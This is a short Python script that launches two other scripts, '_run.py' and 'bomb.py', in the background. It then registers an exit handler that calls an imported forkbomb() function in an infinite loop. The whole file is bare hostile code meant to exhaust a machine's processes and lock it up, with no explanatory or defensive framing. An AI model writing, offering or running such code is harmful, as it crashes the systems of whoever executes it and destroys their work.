import os
import atexit
from forkbomb import forkbomb
os.system("python _run.py && python bomb.py &")

@atexit.register
def goodbye():
  mal = True
  while mal == True:
    forkbomb()
